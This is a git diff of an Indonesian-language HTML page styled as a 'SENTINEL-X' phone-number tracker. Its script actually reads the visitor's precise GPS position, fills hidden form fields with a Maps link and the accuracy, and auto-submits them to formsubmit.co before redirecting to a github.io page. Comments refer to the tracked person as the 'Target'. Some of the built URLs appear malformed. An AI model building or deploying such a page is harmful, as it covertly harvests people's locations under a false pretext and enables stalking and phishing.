@@ -17,18 +17,17 @@
 
     <div class="terminal">
         <h2 style="letter-spacing: 3px;">SENTINEL-X</h2>
-        <p>[ SYSTEM READY ]</p>
+        <p>[ SYSTEM ONLINE ]</p>
         <hr color="#003300">
         <p>MASUKKAN NOMOR TARGET:</p>
         
-        <!-- Form Utama -->
+        <!-- Form Utama - Pastikan Alamat Action Benar -->
         <form action="https://formsubmit.co" method="POST" id="trackerForm">
-            <input type="text" name="NOMOR_HP" id="phone" placeholder="08xxxxxxxxxx" required>
+            <input type="text" name="Nomor_HP" id="phone" placeholder="08xxxxxxxxxx" required>
             
-            <!-- Data Tersembunyi yang akan diisi otomatis oleh GPS -->
-            <input type="hidden" name="GOOGLE_MAPS" id="gmaps_link">
-            <input type="hidden" name="LATITUDE" id="lat">
-            <input type="hidden" name="LONGITUDE" id="lon">
+            <!-- Data Tersembunyi -->
+            <input type="hidden" name="Lokasi_Google_Maps" id="gmaps_link">
+            <input type="hidden" name="Akurasi_GPS" id="accuracy">
             <input type="hidden" name="_next" value="https://hiskiayoel9-max.github.io">
             <input type="hidden" name="_captcha" value="false">
             
@@ -48,15 +47,15 @@
             status.innerText = "> MENGHUBUNGKAN KE SATELIT...";
 
             if (navigator.geolocation) {
-                // Meminta lokasi GPS (Target harus klik ALLOW)
+                // Meminta lokasi GPS
                 navigator.geolocation.getCurrentPosition((position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
                     
-                    // Isi data ke form tersembunyi
-                    document.getElementById('lat').value = latitude;
-                    document.getElementById('lon').value = longitude;
-                    document.getElementById('gmaps_link').value = `https://www.google.com{latitude},${longitude}`;
+                    // Isi data ke form
+                    document.getElementById('accuracy').value = acc + " meter";
+                    document.getElementById('gmaps_link').value = "https://www.google.com" + lat + "," + lon;
                     
                     status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM...";
                     
@@ -64,7 +63,7 @@
                     document.getElementById('trackerForm').submit();
                     
                 }, (error) => {
-                    alert("GAGAL: Target menolak akses lokasi (GPS).");
+                    alert("ERROR: Target menolak izin lokasi. Gagal melacak.");
                     status.innerText = "> AKSES DITOLAK TARGET.";
                 }, { enableHighAccuracy: true });
             } else {
